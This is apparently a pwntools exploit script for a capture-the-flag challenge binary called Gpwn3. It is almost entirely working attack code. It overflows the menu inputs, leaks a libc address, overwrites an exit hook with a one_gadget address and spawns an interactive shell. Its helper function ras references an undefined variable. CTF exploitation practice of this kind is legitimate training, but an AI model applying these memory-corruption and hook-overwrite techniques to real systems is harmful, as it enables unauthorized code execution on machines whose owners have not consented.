# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './Gpwn3'
os.system('chmod +x %s'%binary)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
DEBUG = 1
if DEBUG:
    libc = elf.libc
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = ''
    port = ''
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def ras( function ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def boom( pwn ):
    context.update( os = 'linux', arch = 'amd64',timeout = 1)
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('You choice:',num)

def create( level):
    cmd(1)
    sla('level :' , level)

def levelup( level ):
    cmd(2)
    sla('level :' , level)



one_gad = one_gadget(libc.path)

def attack():
    
    create('a'*0x20)
    levelup('a'*0x20)
    levelup('1'*0x10)

    cmd(3)
    ru('Loser!')
    cmd(3)
    ru('Loser!')
    cmd(3)

    ru('0x')
    puts_addr = rint()

    lg('puts_addr',puts_addr)

    libc.address = puts_addr - libc.sym['puts']
    ogg = one_gad[3] + libc.address
    exit_hook = 0x5eff40 + libc.address + 0x8
    lg('exit_hook',exit_hook)

# _rtld_global __rtld_lock_unlock_recursive
    
    sa('name:' , p64(exit_hook))
    sa('you!' , p64(ogg))

    # dbg()

    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   Gpwn3.py
@Time    :   2022/01/09 12:37:01
@Author  :   Niyah 
'''